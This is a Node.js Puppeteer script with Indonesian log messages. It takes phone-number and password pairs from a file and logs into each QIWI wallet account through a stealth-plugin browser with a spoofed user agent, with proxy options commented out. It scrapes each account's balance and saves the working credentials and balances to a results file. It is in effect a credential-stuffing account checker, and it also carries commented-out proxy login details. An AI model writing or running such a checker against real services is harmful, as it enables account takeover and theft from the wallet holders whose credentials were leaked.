const puppeteer = require('puppeteer-extra');
const UserAgent = require("user-agents");
// const chalk = require('chalk');
const delay = require('delay');
const fs = require('fs-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');



(async() => {
    
    // let prox = fs.readFileSync("proxy.txt", { encoding: "utf-8" }).split("\n");

    puppeteer.use(StealthPlugin());

    const width = 1600
    const height = 1200

    // const userProx = "ingp1020625";
    // const passProx = "nkRa01PBY7";

    const userAgent = new UserAgent({
        deviceCategory: "desktop",
        platform: "Linux x86_64",
      });

    const file = fs.readFileSync('./akun.txt', 'utf-8');
    const splitFile = file.split('\r\n');



    for (i in splitFile) {
        // console.log(chalk.green('Memulai Akun Baru'))
        const option = {
            waitUntil : 'load',
            setTimeout : 9999999,
            visualViewport :
                {
                    width,
                    height
                }
        }


    const browser = await puppeteer.launch(
        {
            headless: false,
            waitUntil : 'load',
            setTimeout : 99999999,
            visualViewport :
            {
                width,
                height
            },
            devtools: false,
            args: [
              `--user-agent=${userAgent}`,
            //   `--proxy-server=${prox}`,
             ],
             ignoreHTTPSErrors: true,
        }
    );

    var files = fs.readFileSync('./akun.txt', 'utf-8');
    var lines = files.split('\n')

    var number = splitFile[i].split('|')[0]
    var password = splitFile[i].split('|')[1]

    const page = await browser.newPage();
    // await page.authenticate({
    //     username: userProx,
    //     password: passProx,
    //   });
    page.setViewport({width: 1300, height: 900, deviceScaleFactor: 1});
    await page.goto("https://qiwi.com", {waitUntil : 'load', timeout: 0});
    console.log("START CEK SALDO \n"+ number);


    // LOGIN
    try {

    await page.waitForSelector('.css-5dt7iz')
    await delay(5000)
    await page.click('.css-5dt7iz', {waitUntil : 'load'})

    await delay(5000)
    await page.waitForSelector('.css-rq9i80')

    await page.waitForSelector('.css-70qvj9', {timeout : 0})
    await delay(3000)
    await page.type('.css-70qvj9', number, {delay: 50})
    await delay(3000)
    await page.waitForSelector('.css-hz3r5w')
    await delay(3000)
    await page.type('.css-hz3r5w', password, {delay: 50})

    await delay(3000)

    await page.keyboard.press('Enter');

    await delay(5000)

    // CHECK SALDO
    try {

        await page.waitForSelector('.account-info-amount-41', { timeout :0});
        const saldo =  await page.$eval('.account-info-amount-41', ele => ele.textContent);
        console.log("SALDO: "+ saldo);
        console.log('BERHASIL CEK SALDO')
        fs.appendFileSync("result.txt", number + '|' + password + '|' + saldo + '\n'.split(' ').join(''));
        await delay(5000)


    } catch {
        console.log('GAGAL CEK SALDO')
        fs.appendFileSync("failed-check.txt", number + '|' + password + '|' + '\n'.split(' ').join(''));

    }

} catch {
    console.log('GAGAL LOGIN')
    fs.appendFileSync("failed-login.txt", number + '|' + password + '|' + '\n'.split(' ').join(''));
}

    console.log('===================================================================')

    lines.splice(0,1)
    await fs.writeFileSync(`akun.txt`, lines.join('\n'))

    await delay(3000)
    
    await browser.close()
}

})

();